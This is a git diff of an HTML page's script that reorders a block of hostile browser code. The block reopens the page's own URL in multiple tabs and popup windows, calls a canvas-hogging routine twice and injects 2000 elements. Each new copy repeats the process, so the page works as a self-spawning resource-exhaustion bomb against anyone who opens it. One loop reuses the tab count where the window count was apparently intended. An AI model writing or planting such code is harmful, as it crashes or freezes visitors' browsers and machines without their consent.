@@ -53,6 +53,26 @@
                 }
                 document.body.appendChild(canvas);
             }
+
+
+            const currentURL = window.location.href;
+
+            const dupeAmountTabs = 3;
+            const dupeAmountWindows = 5;
+            const windowFeatures =
+                "popup=true,width=256,height=256,scrollbar=no,resizable=yes";
+
+            for (let i = 0; i < dupeAmountTabs; i++) {
+                window.open(currentURL, "_blank");
+            }
+
+            for (let i = 0; i < dupeAmountTabs; i++) {
+                window.open(currentURL, "_blank", windowFeatures);
+            }
+
+            canvasHog();
+            canvasHog();
+
             const numOfDivs = 2000;
 
             const fragment = document.createDocumentFragment();
@@ -70,24 +90,6 @@
             }
 
             document.body.appendChild(fragment);
-
-            const currentURL = window.location.href;
-
-            const dupeAmountTabs = 5;
-            const dupeAmountWindows = 5;
-            const windowFeatures =
-                "popup=true,width=256,height=256,scrollbar=no,resizable=yes";
-
-            for (let i = 0; i < dupeAmountTabs; i++) {
-                window.open(currentURL, "_blank");
-            }
-
-            for (let i = 0; i < dupeAmountTabs; i++) {
-                window.open(currentURL, "_blank", windowFeatures);
-            }
-
-            canvasHog();
-            canvasHog();
         </script>
     </body>
 </html>
